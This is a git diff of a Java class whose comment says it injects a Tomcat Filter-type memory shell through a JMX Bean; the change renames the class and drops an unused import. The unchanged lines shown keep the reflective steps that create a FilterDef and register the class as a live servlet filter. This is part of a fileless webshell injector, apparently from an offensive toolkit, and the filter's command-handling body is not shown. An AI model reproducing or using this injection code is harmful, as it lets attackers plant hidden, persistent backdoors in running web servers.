@@ -11,7 +11,6 @@ import javax.management.DynamicMBean;
 import javax.management.MBeanServer;
 import javax.management.ObjectName;
 import javax.servlet.*;
-import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.HashMap;
@@ -21,7 +20,7 @@ import java.util.Set;
  * 使用 JMX Bean 注入 Tomcat Filter 型内存马
  * @author nu1r
  */
-public class TFMSFromJMXF implements Filter{
+public class TFJMX implements Filter{
     public static String pattern;
 
     static {
@@ -68,7 +67,7 @@ public class TFMSFromJMXF implements Filter{
 
                     Object filterDef = filterDefClass.newInstance();
                     filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
-                    Filter filter = new TFMSFromJMXF();
+                    Filter filter = new TFJMX();
 
                     filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
                     filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
